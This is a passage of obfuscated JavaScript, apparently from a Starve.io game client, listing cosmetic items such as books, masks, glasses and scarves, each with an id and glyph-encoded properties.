					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Diamond Book"
				}, {
					id: 9,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠⵠⲆⲆⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ΔⲆⵠᐃΔⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Obscure Book"
				}, {
					id: 16,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃⵠⵠⲆⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃΔᐃⵠᐃⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Rolled Parchment"
				}, {
					id: 22,
					"ᐃΔⲆ": ⲆΔ.ΔΔⲆᐃΔⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠΔᐃⲆΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Cake Book"
				}, {
					id: 23,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆΔᐃⲆΔΔ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃᐃᐃΔⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Christmas Cake Book"
				}, {
					id: 30,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠⵠᐃⲆⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆⲆⲆⵠᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[21],
					name: "Fish Book"
				}, {
					id: 31,
					"ᐃΔⲆ": ⲆΔ.ΔⲆⵠⵠΔᐃΔ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃⲆᐃᐃᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[373],
					name: "Once upon a time"
				}, {
					id: 48,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⵠⲆⲆⲆΔ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃᐃⵠⲆΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Chrono Clock"
				}, {
					id: 49,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⲆⲆΔΔΔ,
					"ΔΔᐃ": ⲆΔ.ⵠΔΔΔΔᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Recipe Book"
				}, {
					id: ⵠΔΔⵠⲆ,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠᐃᐃᐃⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃΔᐃⵠⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Amethyst Book"
				}, {
					id: 28,
					"ᐃΔⲆ": ⲆΔ.ΔⵠᐃⲆⲆΔⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠⲆⵠⵠⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Paint Pallet"
				}, {
					id: 29,
					"ᐃΔⲆ": ⲆΔ.ΔⵠⵠⵠΔΔⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠΔⵠⵠᐃΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[373],
					name: "Watermelon Book"
				}, {
					id: 27,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃⲆΔⵠΔᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠⲆⵠⵠⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Thornbush Book"
				}, {
					id: 35,
					"ᐃΔⲆ": ⲆΔ.ⵠΔΔᐃᐃΔΔ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⲆⵠⵠΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Menu"
				}, {
					id: 36,
					"ᐃΔⲆ": ⲆΔ.ᐃΔᐃⵠⲆⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃΔΔΔᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[373],
					name: "Lover Letter"
				}, {
					id: 40,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⵠⲆⲆⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃⵠⲆΔⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Fresh-Baked Cookies"
				}, {
					id: 41,
					"ᐃΔⲆ": ⲆΔ.ΔΔⲆᐃⵠΔⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆΔⲆᐃⲆⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Inside, there is just a book."
				}, {
					id: 45,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⵠⵠⲆᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠΔΔΔⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Crafting Machine"
				}, {
					id: 33,
					"ᐃΔⲆ": ⲆΔ.ⵠΔᐃΔᐃᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ΔᐃⵠΔⵠᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Winter Book"
				}, {
					id: 34,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠᐃᐃᐃΔᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆⵠⵠΔᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Autumn Book"
				}, {
					id: 14,
					"ᐃΔⲆ": ⲆΔ.ᐃΔᐃΔᐃΔⲆ,
					"ΔΔᐃ": ⲆΔ.ΔⲆᐃⲆⲆᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Reidite Book"
				}, {
					id: ᐃⲆⲆΔΔⲆᐃ,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⲆⵠᐃΔᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆΔΔᐃⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[36],
					name: "Lava Book"
				}, {
					id: 26,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⵠⲆΔⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆΔⲆⲆΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Lava Book 2"
				}, {
					id: 19,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⵠⵠⲆⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆⲆᐃΔⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[36],
					name: "Ocean Mystery"
				}, {
					id: 21,
					"ᐃΔⲆ": ⲆΔ.ΔⲆᐃᐃⵠᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠⵠⵠⵠⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Dragon Book"
				}, {
					id: 42,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⵠⵠᐃᐃΔ,
					"ΔΔᐃ": ⲆΔ.ΔΔᐃⲆⵠᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Engineer Book"
				}, {
					id: 43,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠᐃᐃᐃΔⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆᐃᐃⵠⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Nightmare Book"
				}, {
					id: 44,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⲆⲆⵠΔᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠⵠΔΔⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[427],
					name: "Mystery Book"
				}, {
					id: 46,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⲆⲆⵠⵠΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆΔᐃⵠᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Cursed Book"
				}],
				"ⲆⲆᐃᐃᐃ": [{
					id: 0,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠⲆᐃⵠⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠⲆᐃⵠⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠᐃⵠΔΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Nothing"
				}, {
					id: 2,
					"ᐃΔⲆ": ⲆΔ.ᐃΔᐃᐃᐃᐃΔ,
					"ΔΔᐃ": ⲆΔ.ᐃΔΔⵠⲆΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠᐃⵠΔΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Pink Cheeks"
				}, {
					id: ⵠΔΔΔΔ,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⵠᐃΔᐃΔ,
					"ΔΔᐃ": ⲆΔ.ΔⵠⵠᐃⲆᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠᐃⵠΔΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Heart"
				}, {
					id: 1,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⵠⵠΔⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆΔⲆⲆΔⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠᐃⵠΔΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Bandage 1"
				}, {
					id: 4,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃⲆⲆᐃⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ⲆΔⵠⵠΔΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠᐃⵠΔΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Flower 1"
				}, {
					id: 5,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⵠΔΔΔᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃᐃⲆᐃΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Bow 1"
				}, {
					id: ⲆᐃⲆΔΔ,
					"ᐃΔⲆ": ⲆΔ.ΔᐃΔⵠⵠⲆΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆⵠⵠΔΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Bandage 2"
				}, {
					id: ⲆᐃᐃᐃΔ,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⲆⵠⲆⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ΔΔⵠΔΔⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Flower 2"
				}, {
					id: 8,
					"ᐃΔⲆ": ⲆΔ.ⵠΔΔⲆⲆⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆⲆΔⲆΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Bandage 3"
				}, {
					id: 36,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃⵠⵠⵠΔΔ,
					"ΔΔᐃ": ⲆΔ.ΔⲆⲆⲆⲆⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Foliage"
				}, {
					id: 59,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆΔⵠΔΔⵠ,
					"ΔΔᐃ": ⲆΔ.ΔΔⲆᐃⲆⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Peaceful"
				}, {
					id: 67,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆΔⵠᐃᐃΔ,
					"ΔΔᐃ": ⲆΔ.ᐃΔⵠᐃΔⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Sparkles"
				}, {
					id: 68,
					"ᐃΔⲆ": ⲆΔ.ᐃΔⵠⵠΔᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠΔᐃΔⲆΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Luxury"
				}, {
					id: 69,
					"ᐃΔⲆ": ⲆΔ.ΔᐃΔⲆΔᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃⵠΔΔᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Snow Flakes Crown"
				}, {
					id: ⵠᐃⵠⲆⲆ,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃⵠᐃⵠΔⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃⲆⲆΔΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Glasses 1"
				}, {
					id: ⵠⵠΔⲆᐃ,
					"ᐃΔⲆ": ⲆΔ.ΔΔⲆⲆΔⵠΔ,
					"ΔΔᐃ": ⲆΔ.ΔⲆᐃᐃᐃΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Bow 2"
				}, {
					id: 11,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⲆᐃⵠⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃΔᐃΔⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Little Stars"
				}, {
					id: 12,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠⲆⲆⲆᐃΔ,
					"ΔΔᐃ": ⲆΔ.ⵠΔⵠᐃⲆΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Pirate Eye Patch 1"
				}, {
					id: 44,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⲆⲆΔΔⲆ,
					"ΔΔᐃ": ⲆΔ.ΔⲆΔΔᐃᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Pirate Eye Patch 2"
				}, {
					id: 23,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃΔΔⲆᐃΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠᐃⵠΔᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Clown nose"
				}, {
					id: 16,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠⵠⵠΔⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⵠᐃΔⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Eye Patch"
				}, {
					id: 30,
					"ᐃΔⲆ": ⲆΔ.ⲆΔΔⲆⲆⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆⵠⲆⲆⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Flower 3"
				}, {
					id: 38,
					"ᐃΔⲆ": ⲆΔ.ΔⲆΔⵠΔⲆΔ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆⵠⵠⵠᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[36],
					name: "False Nose"
				}, {
					id: 74,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠⲆΔⵠΔⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆΔΔΔⵠᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Red Cloth"
				}, {
					id: 75,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆΔᐃⲆᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆⵠΔⵠᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Blue Cloth"
				}, {
					id: 79,
					"ᐃΔⲆ": ⲆΔ.ⵠΔⵠΔⲆⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃΔⲆⲆΔⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Transparent Mask"
				}, {
					id: 89,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⵠᐃᐃⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠΔΔΔᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[293],
					name: "Starve.io Anime"
				}, {
					id: 94,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⵠᐃⵠΔᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆᐃᐃᐃⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": "Ant",
					name: "Hero Mask"
				}, {
					id: 100,
					"ᐃΔⲆ": ⲆΔ.ΔΔⵠⵠΔΔᐃ,
					"ΔΔᐃ": ⲆΔ.ΔⵠⵠᐃⵠΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "This starver is mad"
				}, {
					id: 104,
					"ᐃΔⲆ": ⲆΔ.ΔⵠⲆⲆΔΔⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃᐃⵠᐃᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Scars"
				}, {
					id: 106,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆᐃᐃⵠᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠⲆⵠⲆᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "In Search of Intelligence"
				}, {
					id: 109,
					"ᐃΔⲆ": ⲆΔ.ⵠΔΔΔᐃᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃᐃⲆⲆⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Reclaimed Bandage"
				}, {
					id: 111,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⲆⲆᐃΔⲆ,
					"ΔΔᐃ": ⲆΔ.ΔⵠⲆⵠᐃⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Unwrap Starver for Gift"
				}, {
					id: 15,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆⵠᐃΔⵠΔ,
					"ΔΔᐃ": ⲆΔ.ΔᐃΔΔⵠⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Star Glasses"
				}, {
					id: 21,
					"ᐃΔⲆ": ⲆΔ.ΔⲆⵠⲆⲆΔⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠⵠΔᐃᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Great-aunt's Glasses"
				}, {
					id: 24,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⵠΔⲆⲆΔ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃᐃⵠⲆΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Little Starver"
				}, {
					id: 22,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆᐃΔΔⵠΔ,
					"ΔΔᐃ": ⲆΔ.ΔᐃΔⲆⵠⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Little Glasses"
				}, {
					id: ⲆⵠΔⵠΔΔΔ,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆᐃⵠΔᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ΔΔᐃᐃⲆⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Flower Chain"
				}, {
					id: 29,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⵠΔⵠΔᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃᐃⵠᐃᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Horns"
				}, {
					id: 31,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠⲆΔΔΔᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠᐃⵠΔⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Golden Flower"
				}, {
					id: 40,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃⲆΔⵠᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃΔⵠⵠᐃΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Sleeping Mask"
				}, {
					id: 57,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆΔᐃΔⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠᐃΔᐃⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Fish on your head"
				}, {
					id: 58,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠⵠⲆⵠⲆΔ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃΔΔⵠⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Rose"
				}, {
					id: 91,
					"ᐃΔⲆ": ⲆΔ.ΔⵠᐃΔⵠⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠᐃᐃⲆᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[263],
					name: "Grey Scarf"
				}, {
					id: 92,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⵠⵠⲆΔᐃ,
					"ΔΔᐃ": ⲆΔ.ΔⲆᐃᐃⲆⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[263],
					name: "Black Scarf"
				}, {
					id: 93,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃΔᐃᐃᐃΔ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃⲆⵠΔᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[263],
					name: "Skull Mask"
				}, {
					id: 95,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⲆΔⵠΔⵠ,
					"ΔΔᐃ": ⲆΔ.ΔᐃⵠᐃⲆᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Golden Monocle"
				}, {
					id: 96,
					"ᐃΔⲆ": ⲆΔ.ᐃΔΔⲆⲆᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆΔᐃⵠΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "A simple instruction"
				}, {
					id: 102,
					"ᐃΔⲆ": ⲆΔ.ⵠΔⵠΔⲆᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃΔⲆᐃᐃⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Garland"
				}, {
					id: 103,
					"ᐃΔⲆ": ⲆΔ.ⵠΔᐃᐃᐃΔⵠ,
					"ΔΔᐃ": ⲆΔ.ΔΔⵠⵠⵠⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "The Doormat"
				}, {
					id: 108,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃⵠⵠⲆⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠⵠΔᐃⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Copium Tanks"
				}, {
					id: 117,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠⲆΔⵠΔⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆⲆΔⵠⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Eyelashes"
				}, {
					id: 118,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⲆΔⲆᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃΔⲆΔⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Helmet Prototype"
				}, {
					id: ⵠᐃΔⵠΔ,
					"ᐃΔⲆ": ⲆΔ.ΔⲆΔᐃⲆΔΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠⵠⵠⵠⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Fancy Glasses"
				}, {
					id: 25,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃⲆᐃⲆΔⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆΔⲆⵠΔⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Medecin Mask"
				}, {
					id: 14,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠΔΔⵠⲆΔ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⲆⲆᐃᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Mr. Mayor"
				}, {
					id: ᐃΔⵠᐃⵠᐃⲆ,
					"ᐃΔⲆ": ⲆΔ.ΔΔⵠΔⲆᐃΔ,
					"ΔΔᐃ": ⲆΔ.ΔⲆᐃⵠⵠᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
